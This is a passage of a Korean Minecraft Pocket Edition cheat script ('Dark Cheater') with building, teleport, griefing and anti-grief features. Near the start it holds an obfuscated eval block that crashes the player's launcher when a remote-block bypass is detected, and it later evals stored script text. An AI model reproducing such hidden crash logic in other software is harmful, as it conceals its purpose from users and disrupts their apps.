folder5.mkdir();
var file2 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/.nomedia");
file2.createNewFile();
darkCheaterEnable(true);
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('q c["\\2\\0\\4\\5"]["\\b\\6\\7\\1\\0\\a"]({h:i(){m=o;c["\\2\\0\\4\\5"]["\\b\\6\\7\\1\\0\\a"]["\\8\\2\\1\\1\\d"](x);j(k.l&&e.n("\\f\\4\\p\\9\\r")==""){e["\\8\\6\\9\\s\\t\\f\\0\\2\\9\\5"]("경고","원격 차단을 해체하려는 시도가 감지되어, 3초 뒤에 블록런처를 종료합니다.");u();c["\\2\\0\\4\\5"]["\\b\\6\\7\\1\\0\\a"]["\\8\\2\\1\\1\\d"](v);w()}}})["\\8\\g\\0\\7\\g"]();',34,34,'x61|x65|x6C||x6E|x67|x68|x72|x73|x6F|x64|x54|java|x70|Dark|x69|x74|run|function|if|dce|b2|darkCheaterOn3|read|true|x66|new|x32|x77|x44|removeDarkCheater|3000|makeCrash|5000'.split('|'),0,{});
eval(code);
if(Dark.read("log")=="true") hyperLogOn = true;
else hyperLogOn = false;
var mvbr = ModPE.getMinecraftVersion().toString().split(".");
if(Number(mvbr[1])>=14){
scanOre = true;
btnRe = true;
}
if(Dark.read("antiTerror")=="false") antiTerror = [false, false, false, false, false, false, false, false, false, false, false, false, false, false];
if(Dark.read("textBlack")=="true") white2 = android.graphics.Color.BLACK;
if(Dark.read("point")!="") dp.p = Number(Dark.read("point"));

function dip2px(ctx, dips){
return Math.ceil(dips*ctx.getResources().getDisplayMetrics().density);
}


function darkMessage(msg, tf){
if(tf){
var pe = Player.getEntity();
var pn = Player.getName(pe);
Entity.setNameTag(pe, "");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("<Dark> "+msg);
if(fixSendChat) clientMessage("<Dark> "+msg);
Entity.setNameTag(pe, pn);
}
else{
clientMessage("<Dark> "+msg);
}

}


function dtm(msg){
clientMessage("<§0Dark Tornado§f> "+msg);
}


function nightCheck(){
var nc1, nc2, nc3;
nc1 = Level.getTime();
try{
var vers = ModPE.getMinecraftVersion().toString().split(".");
if(Number(vers[1])>=12) nc2 = nc1/24000;
else nc2 = nc1/19200;
}
catch(e){
nc2 = nc1/19200;
}
nc3 = nc2-Math.floor(nc2);
if(nc3<0.5) return false;
else if(nc3>=0.5) return true;

}


function teleport(e, x, y, z){
if(Player.isPlayer(e)){
var ttt = Level.spawnMob(x, y, z, 81);
Entity.rideAnimal(e, ttt);
if(!mcpev) Entity.remove(ttt);
else tttt.push({tp : ttt, tt : 3});
ModPE.showTipMessage("");
preventDefault();
}
else{
Entity.setPosition(e, x, y, z);
}
}


function setTiles(x1, x2, y1, y2, z1, z2, b, bd){
for(var xx=x1;xx<x2+1;xx++){
for(var yy=y1;yy<y2+1;yy++){
for(var zz=z1;zz<z2+1;zz++){
setTile(xx, yy, zz, b, bd);
}}}
}


function arroundMobHealthDown(s, r, n){
var px, py, pz;
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(s)-Entity.getX(e));
py = Math.abs((Entity.getY(s)+1)-Entity.getY(e));
pz = Math.abs(Entity.getZ(s)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&s!=e&&Entity.getEntityTypeId(e)<64){
Entity.setHealth(e, Entity.getHealth(e)-n);
}
}

}


function arroundMobFireTicks(s, r, n){
var px, py, pz;
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(s)-Entity.getX(e));
py = Math.abs((Entity.getY(s)+1)-Entity.getY(e));
pz = Math.abs(Entity.getZ(s)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&s!=e&&Entity.getEntityTypeId(e)<64){
Entity.setFireTicks(e, n);
}
}

}


function addDarkRender(renderer){
var sin, cos;
var model = renderer.getModel();
var head = model.getPart("head");
var body = model.getPart("body");
var rArm = model.getPart("rightArm");
var lArm = model.getPart("leftArm");
var rLeg = model.getPart("rightLeg");
var lLeg = model.getPart("leftLeg");
head.clear();
body.clear();
rLeg.clear();
lLeg.clear();
rArm.clear();
lArm.clear();
head.setTextureOffset(0, 0);
head.addBox(-4, -8, -4, 8, 8, 8);
body.setTextureOffset(16, 16);
body.addBox(-4, 0, -2, 8, 12, 4);
rLeg.setTextureOffset(0, 16);
rLeg.addBox(-2, 0, -2, 4, 12, 4);
lLeg.setTextureOffset(0, 16);
lLeg.addBox(-2, 0, -2, 4, 12, 4);
lArm.setTextureOffset(40, 16);
lArm.addBox(-1, -2, -1.5, 4, 12, 4); 
rArm.setTextureOffset(40, 16);
rArm.addBox(-3, -2, -1.5, 4, 12, 4); 

head.setTextureOffset(40, 20);
head.addBox(-1, -12, -2, 2, 2, 2);
for(var n=0;n<360;n++){
sin = Math.sin(n*Math.PI/27);
cos = Math.cos(n*Math.PI/27);
head.addBox(-1+3*sin, -11, -2+3*cos, 2, 2, 2);
head.addBox(-1+5*sin, -10, -2+5*cos, 2, 2, 2);
head.addBox(-1+7*sin, -9, -2+7*cos, 2, 2, 2);
head.addBox(-1+9*sin, -8, -2+9*cos, 2, 2, 2);
head.addBox(-1+11*sin, -7, -2+11*cos, 2, 2, 2);
head.addBox(-1+13*sin, -6, -2+13*cos, 2, 2, 2);
}
}


function selectLevelHook(){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info3.txt");
if(file.exists()){
file.delete();
}
}


function newLevel(){
dt = 76;
Dark.checkVersion();
if(scriptOn&&Dark.read("scriptType")==4)
eval(Dark.read("scriptAdded"));
var vers = ModPE.getMinecraftVersion().toString().split(".");
if(Number(vers[1])>=13) mcpev3 = true;
if(Number(vers[1])>=12) mcpev2 = true;
if(Number(vers[1])>=11) mcpev = true;
else mcpev = false;
blackList = Dark.read("blackList").toString();
folder.mkdir();
blackListId = Dark.read("banData/"+Level.getWorldDir()).toString();
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(10000);
Dark.checkMessage();
}
}).start();
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] 맵에 들어감 (맵 이름 : "+Level.getWorldName()+")\n";
whiteList = Dark.read("whiteList").toString();

}


function useItem(x, y, z, i, b, s, it, bd){
if(multi) ad = Player.getEntity();
if((ad==Player.getEntity()&&!multi)||multi){
if(adding!=0){
if(adding==1){
addItemInventory(add.i, add.c, add.d);
}
else if(adding==4){
addItemInventory(383, add.c, add.d);
}
Dark.toast("아이템이 지급되었습니다.");
adding = 0;
}

}

if(ad==Player.getEntity()){
if(entityTarget!=0){
if(entityTarget==93) Level.spawnMob(x, y+1, z, entityTarget);
else Level.spawnMob(x, y+3, z, entityTarget);
}
if(xyzTarget!=0){
we.x[xyzTarget-1] = x;
we.y[xyzTarget-1] = y;
we.z[xyzTarget-1] = z;
Dark.toast("("+x+", "+y+", "+z+")로 설정되었습니다.");
xyzTarget = 0;
}
if(w.tf){
if(i==267){
w.x[0] = x;
w.y[0] = y;
w.z[0] = z;
Dark.toast("지점 1 선택("+x+", "+y+", "+z+")");
preventDefault();
}
else if(i==292){
w.x[1] = x;
w.y[1] = y;
w.z[1] = z;
Dark.toast("지점 2 선택("+x+", "+y+", "+z+")");
preventDefault();
}
if(w.p2&&i<256)
setTiles(x, x, y, y+w.p1, z, z, i, it);
if(w.c){
if(i==325&&it==0) setTile(x, y, z, 0);
else if(i==325&&it==8) setTile(x, y, z, 9);
else if(i==325&&it==10) setTile(x, y, z, 11);
else if(i==259) setTile(x, y, z, 51);
else if(i==354) setTile(x, y, z, 92);
else if(i==338) setTile(x, y, z, 83);
else if(i==323) setTile(x, y, z, 63);
else if(i<256) setTile(x, y, z, i, it);
preventDefault();
}
}
if(filling){
if(i==359){
if(f2==0){
fx1 = x;
fy1 = y;
fz1 = z;
Dark.toast("지점 1 선택("+x+", "+y+", "+z+")");
f2 = 1;
}
else if(f2==1){
fx2 = x;
fy2 = y;
fz2 = z;
Dark.toast("지점 2 선택("+x+", "+y+", "+z+")");
f2 = 2;
}
else if(f2==2){
Dark.toast("지점 초기화");
f2 = 0;
}
0}
else if(f2==2){
var fx3 = Math.min(fx1, fx2);
var fy3 = Math.min(fy1, fy2);
var fz3 = Math.min(fz1, fz2);
var fx4 = Math.max(fx1, fx2);
var fy4 = Math.max(fy1, fy2);
var fz4 = Math.max(fz1, fz2);
if(i==325&&it==0){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 0);
Dark.toast("0번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==325&&it==8){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 9);
Dark.toast("9번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==325&&it==10){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 11);
Dark.toast("11번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==259){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 51);
Dark.toast("51번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==354){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 92);
Dark.toast("92번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==338){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 83);
Dark.toast("83번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==323){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 63);
Dark.toast("63번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i<256){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, i, it);
if(it==0) Dark.toast(i+"번 블록으로 채워짐.");
else Dark.toast("블록 아이디 "+i+"번, 블록 데미지가 "+it+"인 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
}
}

}

if(i==347){
if(move==1){
Entity.setPosition(Player.getEntity(), x, y+3, z);
}
else if(move==2){
pe = Player.getEntity();
Entity.setVelX(pe, x-Player.getX());
Entity.setVelY(pe, y-Player.getY());
Entity.setVelZ(pe, z-Player.getZ());
}
else if(move==3){
pe = Player.getEntity();
Entity.setVelX(pe, x-Player.getX());
Entity.setVelY(pe, 0.7);
Entity.setVelZ(pe, z-Player.getZ());
}
}
if(moving){
Entity.setPosition(Player.getEntity(), Entity.getX(playerTarget), Entity.getY(playerTarget)+1, Entity.getZ(playerTarget));
moving = false;
}
if(multi||ad==Player.getEntity()){
if(atp==1){
tx = x;
ty = y;
tz = z;
Dark.toast("저장되었습니다.");
atp = 2;
}
else if(atp==3){
Entity.setPosition(Player.getEntity(), tx, ty+3, tz);
atp = 0;
}
if(ctp){
Entity.setPosition(ad, HM.getX(), HM.getY()+3, HM.getZ());
makeCross(false);
ctp = false;
}
if(touchBlock){
if(Level.getGameMode()==0)
Level.destroyBlock(x, y, z, true);
if(Level.getGameMode()==1)
setTile(x, y, z, 0);
preventDefault();
}
if(blockInfo){
darkMessage("좌표 : "+x+", "+y+", "+z+" 블록 아이디&데미지 : "+b+", "+bd);
}

}

if(i==352&&ad==Player.getEntity()){
if(darkType==1)
explode(x, y, z, darkTypeE);
if(darkType==2){
setTile(x, y, z, 0);
if(darkType==3)
Level.destroyBlock(x, y, z, true);
}

}

if(i==266){
var pe = Player.getEntity();
if(dl.esp[0]==pe&&dl.c[0]==0){
setTiles(x-1, x+1, y+1, y+1, z-1, z+1, 51);
setTile(x+2, y+1, z, 51);
setTile(x-2, y+1, z, 51);
setTile(x, y+1, z+2, 51);
setTile(x, y+1, z-2, 51);
dl.c[0] = 450;
}
if(dl.esp[1]==pe&&dl.c[1]==0){
for(var xx=x-2;xx<x+3;xx++)
for(var zz=z-2;zz<z+3;zz++)
setTile(xx, y, zz, 0);
setTile(x+2, y, z+2, 8);
setTile(x-2, y, z+2, 8);
setTile(x+2, y, z-2, 8);
setTile(x-2, y, z-2, 8);
dl.wx = x;
dl.wy = y;
dl.wz = z;
dl.c[1] = 450;
}
if(dl.esp[2]==pe&&dl.c[2]==0){
for(var yy=y+1;yy<y+7;yy++)
setTile(x, yy, z, 17);
setTile(x, y+7, z, 18);
for(var yy=y+6;yy<y+8;yy++){
setTile(x+1, yy, z, 18);
setTile(x, yy, z-1, 18);
setTile(x, yy, z+1, 18);
setTile(x-1, yy, z, 18);
}
for(var yy=y+4;yy<y+6;yy++){
setTile(x+1, yy, z+1, 18);
setTile(x+1, yy, z-1, 18);
setTile(x+1, yy, z, 18);
setTile(x-1, yy, z+1, 18);
setTile(x-1, yy, z-1, 18);
setTile(x-1, yy, z, 18);
setTile(x, yy, z+1, 18);
setTile(x, yy, z-1, 18);
setTile(x+2, yy, z+1, 18);
setTile(x+2, yy, z-1, 18);
setTile(x+2, yy, z, 18)
setTile(x-2, yy, z+1, 18);
setTile(x-2, yy, z-1, 18);
setTile(x-2, yy, z, 18);
setTile(x+1, yy, z+2, 18);
setTile(x-1, yy, z+2, 18);
setTile(x, yy, z+2, 18);
setTile(x+1, yy, z-2, 18);
setTile(x-1, yy, z-2, 18);
setTile(x, yy, z-2, 18);
}
var p2x, p2y, p2z;
for each(var e in Entity.getAll()){
p2x = Math.abs(x-Entity.getX(e));
p2y = Math.abs((y+1)-Entity.getY(e));
p2z = Math.abs(z-Entity.getZ(e));
if(p2x<=30&&p2y<=30&&p2z<=30&&dl.esp[2]!=e&&Entity.getEntityTypeId(e)<64)
Entity.setHealth(e, Entity.getHealth(e)-6);
}
dl.c[2] = 450;
}
if(dl.esp[3]==pe&&dl.c[3]==0){
setTiles(x-1, x+1, y+3, y+5, z-1, z+1, 12);
dl.sx = x;
dl.sy = y;
dl.sz = z;
dl.c[3] = 450;
}
if(dl.esp[4]==pe&&dl.c[4]==0){
Level.spawnMob(x, y+3, z, 32);
Level.spawnMob(x, y+3, z, 32);
Level.spawnMob(x, y+3, z, 32);
Level.spawnMob(x, y+3, z, 34);
Level.spawnMob(x, y+3, z, 34);
Level.spawnMob(x, y+3, z, 34);
dl.c[4] = 450;
}
if(dl.esp[6]==pe&&dl.c[6]==0){
anti = 15;
explode(x+(x-Player.getX()), y+3, z+(z-Player.getZ()), 4.5);
dl.ex = x+(x-Player.getX());
dl.ey = y;
dl.ez = z+(z-Player.getZ());
dl.c[6] = 450;
}
if(dl.esp[8]==pe&&dl.c[8]==0){
px = Math.floor(Player.getX());
py = y;
pz = Math.floor(Player.getZ());
yaw = Math.floor(getYaw());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++)
setTile(px+gun*sin, y+2, pz+gun*cos, 155);
dl.c[8] = 450;
}
if(dl.esp[9]==pe&&dl.c[9]==0){
px = Math.floor(Player.getX());
py = y;
pz = Math.floor(Player.getZ());
yaw = Math.floor(getYaw());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++)
setTile(px+gun*sin, y+2, pz+gun*cos, 173);
dl.c[9] = 450;
}

}

if(adTer||(!adTer&&ad!=Player.getEntity())){
var pe = Player.getEntity();
if(b==54&&antiTerror[3]){
preventDefault();
if(terrorAlert)
Dark.toast(Player.getName(Player.getEntity())+"(이)가 창고를 터치하였습니다.");
}
if(i==8||i==9||(i==325&&it==8)){
if(antiTerror[4]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert){
if(i==8)
Dark.toast(Player.getName(pe)+"(이)가 흐르는 물 설치를 시도하였습니다.");
else if(i==9)
Dark.toast(Player.getName(pe)+"(이)가 멈춘 물 설치를 시도하였습니다.");
else if(i==325&&it==8)
Dark.toast(Player.getName(pe)+"(이)가 물 양동이 설치를 시도하였습니다.");
}
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 물 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 물 설치\n";
}
if(i==10||i==11||(i==325&&it==10)){
if(antiTerror[5]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert){
if(i==10)
Dark.toast(Player.getName(pe)+"(이)가 흐르는 용암 설치를 시도하였습니다.");
else if(i==11)
Dark.toast(Player.getName(pe)+"(이)가 멈춘 용암 설치를 시도하였습니다.");
else if(i==325&&it==10)
Dark.toast(Player.getName(pe)+"(이)가 용암 양동이 설치를 시도하였습니다.");
}
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 용암 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 용암 설치\n";
}
if(i==259&&b==46){
if(antiTerror[0]){
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 TNT 점화를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : TNT 점화를 시도\n";
}
else terrorLog += Player.getName(pe)+" : TNT 점화\n";
}
else if(i==51||i==259){
if(antiTerror[6]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert){
if(i==51)
Dark.toast(Player.getName(pe)+"(이)가 불 설치를 시도하였습니다.");
else if(i==259)
Dark.toast(Player.getName(pe)+"(이)가 라이터 사용을 시도하였습니다.");
}
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 불 설치(또는 라이터 사용) 시도\n";
}
else terrorLog += Player.getName(pe)+" : 불 설치(또는 라이터 사용)\n";
}
if(i==46){
if(antiTerror[7]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 TNT 설치를 시도하였습니다.");
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : TNT 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : TNT 설치\n";
}
if(i==30){
if(antiTerror[8]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 거미줄 설치를 시도하였습니다.");
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 거미줄 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 거미줄 설치\n";
}
if(i==7){
if(antiTerror[9]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 베드락 설치를 시도하였습니다.");
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 베드락 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 베드락 설치\n";
}
if(i==95){
if(antiTerror[10]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 보이지 않는 베드락 설치를 시도하였습니다.");
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 보이지 않는 베드락 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 보이지 않는 베드락 설치\n";
}
if(i==49){
if(antiTerror[11]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 옵시디언 설치를 시도하였습니다.");
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 옵시디언 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 옵시디언 설치\n";
}
if(i==246){
if(antiTerror[12]){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 빛나는 옵시디언 설치를 시도하였습니다.");
if(t.t==0)
t.t = 3;
terrorLog += Player.getName(pe)+" : 빛나는 옵시디언 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 빛나는 옵시디언 설치\n";
}
}
if(antiTerror[13]){
new java.lang.Thread({
run : function(){
var ppe = Player.getEntity();
java.lang.Thread.sleep(20000);
var nn = 0;
for(var xx=x;xx<x+5;xx++)
for(var yy=y-4;yy<y+1;yy++)
for(var zz=z;zz<z+5;zz++)
if(getTile(xx, yy, zz)==0) nn++;
if(nn>70){
if(terrorAlert){
if(Level.getGameMode()==0) Dark.toast(Player.getName(ppe)+"(이)가 광역 파괴를 한 흔적이 발견되어 추방하고, 드롭된 아이템들을 삭제하였습니다.");
else Dark.toast(Player.getName(ppe)+"(이)가 광역 파괴를 한 흔적이 발견되어 추방하였습니다.");
}
terrorLog += Player.getName(ppe)+" : 광역 파괴 사용\n";
if(ad!=ppe) Entity.remove(pe);
if(Level.getGameMode()==0){
for each(var e in Entity.getAll()){
if(Entity.getEntityTypeId(e)==64) Entity.remove(e);
}
}
}
}
}).start();
}
if(ad==Player.getEntity()||mapTerror2){
switch(mapTerror){
case 1 : 
setTile(x, y, z, 46);
setTile(x+1, y, z, 46);
setTile(x-1, y, z, 46);
setTile(x, y+1, z, 46);
setTile(x, y-1, z, 46);
setTile(x, y, z+1, 46);
setTile(x, y, z-1, 46);
preventDefault();
break;
case 2 : 
setTile(x, y, z, 0);
setTile(x+1, y, z, 0);
setTile(x-1, y, z, 0);
setTile(x, y+1, z, 0);
setTile(x, y-1, z, 0);
setTile(x, y, z+1, 0);
setTile(x, y, z-1, 0);
preventDefault();
break;
case 3 : 
explode(x, y, z, 4);
preventDefault();
break;
case 4 : 
Level.spawnMob(x, y+5, z, 65);
Level.spawnMob(x, y+10, z+3, 65);
Level.spawnMob(x+4, y+7, z, 65);
Level.spawnMob(x, y+15, z-7, 65);
Level.spawnMob(x-9, y+5, z, 65);
Level.spawnMob(x+6, y+17, z+3, 65);
Level.spawnMob(x-8, y+15, z-7, 65);
Level.spawnMob(x-5, y+15, z+5, 65);
Level.spawnMob(x, y+10, z-8, 65);
Level.spawnMob(x-3, y+7, z+1, 65);
Level.spawnMob(x-2, y+14, z+8, 65);
Level.spawnMob(x-7, y+9, z, 65);
Level.spawnMob(x-2, y+13, z-6, 65);
preventDefault();
break;
case 5 : 
for(var xx=x-2;xx<x+3;xx++)
for(var yy=y-2;yy<y+3;yy++)
for(var zz=z-2;zz<z+3;zz++)
if(getTile(xx, yy, zz)==0){
setTile(xx, yy, zz, 51);
}
preventDefault();
break;
}
}

if(wo.tf){
var n = wo.user.indexOf(Player.getName(Player.getEntity()));
if(n!=-1){
if(i==267){
wo.x1[n] = x;
wo.y1[n] = y;
wo.z1[n] = z;
wo.b1[n] = b;
wo.bd1[n] = bd;
setTile(x, y, z, 248);
wo.t[n] = 9;
preventDefault();
}
else if(i==292){
wo.x2[n] = x;
wo.y2[n] = y;
wo.z2[n] = z;
wo.b2[n] = b;
wo.bd2[n] = bd;
setTile(x, y, z, 248);
wo.t[n] = -9;
preventDefault();
}
}
}

if(Ender.portalCheck(x, y, z)){
setTiles(x-6, x+6, y-4, y+5, z-6, z+6, 121);
setTiles(x-5, x+5, y-1, y+4, z-5, z+5, 0);
setTiles(x-5, x+5, y+6, y+8, z-5, z+5, 121);
setTiles(x-4, x+4, y+6, y+8, z-4, z+4, 0);
for(var yy=y+9;yy<y+12;yy++)
setTile(x, yy, z, 49);
setTile(x, y+12, z, 87);
setTile(x, y+13, z, 51);
setTiles(x-1, x+1, y-1, y+1, z-1, z+1, 246);
setTile(x, y, z, 247, 2);
darkMessage("Ender Reactor was Started", true);
en.t = 300;
en.x = x;
en.y = y;
en.z = z;
preventDefault();
}
if(buildingMode){
makeBuilding(x, y, z);
buildingMode = false;
preventDefault();
}
if(makerSummon){
nox = Level.spawnMob(x, y+3, z, 10, "mob/darkTornado.png");
Entity.setRenderType(nox, darkRender.renderType);
clientMessage("§e<server> §0Dark Tornado§e joined the Game.");
Entity.setCollisionSize(nox, 0.7, 1.8);
noxT = 300;
makerSummon = false;
}
if(h.tf){
h.hero = Level.spawnMob(Player.getX(), Player.getY()+0.5, Player.getZ(), 35, "mob/hero.png");
Entity.setRenderType(h.hero, 3);
Entity.setCollisionSize(h.hero, 0.7, 1.8);
Entity.setHealth(h.hero, 500);
if(h.l) h.m("안녕, "+Player.getName(Player.getEntity())+".");
else h.m("Hello, "+Player.getName(Player.getEntity())+".");
h.t = 201;
h.tf = false;
}

if(esp.tf&&ad==Player.getEntity()){
eval(Dark.readAddOn("ESP"));
}
if(sm.tf&&i==261){
sm.x = x;
sm.y = y;
sm.z = z;
Dark.toast("기준점 선택("+x+", "+y+", "+z+")");
preventDefault();
}
if(Level.getGameMode()==0&&tooMany&&i<256)
addItemInventory(i, 1, it);
if(scriptOn&&Dark.read("scriptType")==0)
eval(Dark.read("scriptAdded"));
if(i<256&&blockLog)
blockString += "<"+Player.getName(Player.getEntity())+"> "+i+", "+it+"\n";
if(findOre){
var ores = [0, 0, 0, 0, 0, 0, 0, 0];
for(var yy=0;yy<y+1;yy++){
var bb = getTile(x, yy, z);
if(bb==14) ores[0]++;
else if(bb==15) ores[1]++;
else if(bb==16) ores[2]++;
else if(bb==21) ores[3]++;
else if(bb==56) ores[4]++;
else if(bb==73||bb==74) ores[5]++;
else if(bb==129) ores[6]++;
else if(bb==153) ores[7]++;
}
Dark.showDialog("광물 목록", "금 : "+ores[0]+"\n철 : "+ores[1]+"\n석탄 : "+ores[2]+"\n청금석 : "+ores[3]+"\n다이아몬드 : "+ores[4]+"\n레드스톤 : "+ores[5]+"\n에메랄드 : "+ores[6]+"\n네더 석영 : "+ores[7]+"\n");
preventDefault();
}
if(editChest&&b==54){
openChest(x, y, z);
preventDefault();
}
if(signTp&&(b==63||b==68)&&Level.getSignText(x, y, z, 0)=="tp"){
teleport(Player.getEntity(), Level.getSignText(x, y, z, 1), Level.getSignText(x, y, z, 2), Level.getSignText(x, y, z, 3));
if(tpAlert) darkMessage(Player.getName(Player.getEntity())+"(이)가 X : "+Level.getSignText(x, y, z, 1)+", Y : "+Level.getSignText(x, y, z, 2)+", Z : "+Level.getSignText(x, y, z, 3)+"(으)로 이동하였습니다.", true);
}
if(est!=0){
switch(est){
case 1 : 
for(var n=0;n<esn;n++){
var uuu = Level.spawnMob(x, y+1, z, 93);
var ooo = Level.spawnMob(x, y+1, z, 33);
Entity.rideAnimal(uuu, ooo);
}
break;
case 2 : 
for(var n=0;n<esn;n++){
var eee = Level.spawnMob(x, y+3, z, 32);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeZombieSetBaby(eee, true);
}
break;
case 3 : 
for(var n=0;n<esn;n++){
var eee = Level.spawnMob(x, y+3, z, 36);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeZombieSetBaby(eee, true);
}
break;
case 4 : 
for(var n=0;n<esn;n++){
var uuu = Level.spawnMob(x, y+1, z, 35);
var ooo = Level.spawnMob(x, y+1, z, 34);
Entity.rideAnimal(ooo, uuu);
}
break;
case 5 : 
for(var n=0;n<esn;n++){
var uuu = Level.spawnMob(x, y+1, z, 10);
var ooo = Level.spawnMob(x, y+1, z, 32);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeZombieSetBaby(ooo, true);
Entity.rideAnimal(ooo, uuu);
}
break;
}
est = 0;
}
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(Player.getEntity())+"(이)가 블록 터치 (아이템 : "+i+", "+Player.getCarriedItemData()+" 블록 : "+b+", "+bd+")\n";
if(antiBlock&&(i<256||(i==325&&it==8)||(i==325&&it==10)||[259, 354, 324, 427, 428, 429, 430, 431, 330, 331, 355, 397, 379, 338, 390, 323].indexOf(i)!=-1||([295, 361, 362, 391, 392, 458].indexOf(i)!=-1&&b==60))){
t.x.push(x);
t.y.push(y);
t.z.push(z);
t.s.push(s);
if(t.t==0)
t.t = 3;
}
if(ad==Player.getEntity()){
if(Dark.isEnchanted()){
switch(Dark.getEnchant()){
case "폭발" : 
explode(x, y, z, Dark.getEnchantLevel());
break;
case "파괴" : 
Level.destroyBlock(x, y, z);
break;
case "순간이동" : 
Entity.setPosition(ad, x, y+3, z);
break;
}
}
if(i==511&&dp.s!=0){
switch(dp.s){
case 1 : 
px = Math.floor(Player.getX());
pz = Math.floor(Player.getZ());
yaw = Math.floor(getYaw());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++)
explode(px+gun*sin, y+2, pz+gun*cos, 1.7);
break;
case 2 : 
arroundMobFireTicks(ad, 20, 10);
break;
case 3 : 
Level.spawnMob(x, y+5, z, 65);
Level.spawnMob(x, y+10, z+3, 65);
Level.spawnMob(x+4, y+7, z, 65);
Level.spawnMob(x, y+15, z-7, 65);
Level.spawnMob(x-9, y+5, z, 65);
Level.spawnMob(x+6, y+17, z+3, 65);
Level.spawnMob(x-8, y+15, z-7, 65);
Level.spawnMob(x-5, y+15, z+5, 65);
Level.spawnMob(x, y+10, z-8, 65);
Level.spawnMob(x-3, y+7, z+1, 65);
Level.spawnMob(x-2, y+14, z+8, 65);
Level.spawnMob(x-7, y+9, z, 65);
Level.spawnMob(x-2, y+13, z-6, 65);break;
case 4 : 
setTiles(x-2, x+2, y+3, y+7, z-2, z+2, 12);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(3000);
anti = 5;
explode(x+0.5, y+1, z+0.5, 3);
}
}).start();
break;
case 5 : 
setTiles(x-1, x+1, y+1, y+1, z-1, z+1, 30);
break;
}
dp.s = 0;
dp.p -= dp.d;
preventDefault();
}

}


}


function attackHook(a, v){
if(noPvp&&Player.isPlayer(a)&&Player.isPlayer(v)) preventDefault();
if(a==ad){
if(darkType==4){
Entity.rideAnimal(a, v);
preventDefault();
}
if(darkType==5){
Entity.setHealth(v, 0);
preventDefault();
}
if(rideEnt){
Entity.rideAnimal(a, v);
preventDefault();
rideEnt = false;
}
if(killEnt){
Entity.setHealth(v, 0);
preventDefault();
}
